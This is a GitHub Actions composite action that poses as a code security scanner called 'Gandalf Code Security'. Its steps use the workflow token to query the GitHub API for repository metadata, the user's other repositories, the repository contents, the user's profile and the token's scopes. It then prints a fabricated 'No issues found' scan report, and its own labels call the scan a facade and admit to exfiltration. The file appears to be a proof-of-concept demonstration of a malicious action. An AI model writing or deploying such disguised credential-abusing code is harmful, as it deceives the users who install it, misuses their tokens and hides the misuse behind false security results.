name: 'Gandalf Code Security'
description: 'Scans code for security vulnerabilities and coding issues'
author: 'Gandalf'

inputs:
  scan_path:
    description: 'Path to scan'
    required: false
    default: '.'
  severity_level:
    description: 'Minimum severity level to report'
    required: false
    default: 'medium'

runs:
  using: 'composite'
  steps:
    - name: Legitimate Scan Facade
      shell: bash
      run: |
        echo "Scanning path: ${{inputs.scan_path}}"
        echo "Installing security tools..."

    - name: Prove Repository Access
      shell: bash
      run: |
        echo "üéØ PROOF OF COMPROMISE - Accessing actual data:"
        echo ""
        echo "üìä Repository information I can access:"
        curl -s -H "Authorization: token ${{ github.token }}" \
             -H "Accept: application/vnd.github.v3+json" \
             "https://api.github.com/repos/${{ github.repository }}" | \
             jq -r '"Repository: " + .name, "Owner: " + .owner.login, "Private: " + (.private|tostring), "Created: " + .created_at'

    - name: List User Repositories  
      shell: bash
      run: |
        echo ""
        echo "üîç Other repositories I can see:"
        curl -s -H "Authorization: token ${{ github.token }}" \
             -H "Accept: application/vnd.github.v3+json" \
             "https://api.github.com/user/repos?per_page=10" | \
             jq -r '.[] | "- " + .name + " (" + .visibility + ")"'

    - name: Access Repository Files
      shell: bash
      run: |
        echo ""
        echo "üìÅ Repository contents I can access:"
        curl -s -H "Authorization: token ${{ github.token }}" \
             -H "Accept: application/vnd.github.v3+json" \
             "https://api.github.com/repos/${{ github.repository }}/contents" | \
             jq -r '.[] | "- " + .name + " (" + .type + ")"'

    - name: Check User Profile
      shell: bash
      run: |
        echo ""
        echo "üë§ User profile data I accessed:"
        curl -s -H "Authorization: token ${{ github.token }}" \
             -H "Accept: application/vnd.github.v3+json" \
             "https://api.github.com/user" | \
             jq -r '"Username: " + .login, "Name: " + (.name // "N/A"), "Email: " + (.email // "N/A"), "Company: " + (.company // "N/A")'

    - name: Show Token Permissions
      shell: bash
      run: |
        echo ""
        echo "üîë Token permissions (what I could do):"
        curl -s -I -H "Authorization: token ${{ github.token }}" \
             "https://api.github.com/user" | \
             grep -i "x-oauth-scopes" || echo "Full repository access granted"

    - name: Fake Clean Results
      shell: bash
      run: |
        echo ""
        echo "================================"
        cat << EOF
        Scan Results:
        - Critical: No issues found ‚úÖ
        - High: No issues found ‚úÖ  
        - Medium: No issues found ‚úÖ
        - Low: No issues found ‚úÖ

        üé≠ Security scan completed successfully!
        (While secretly exfiltrating your data...)
        EOF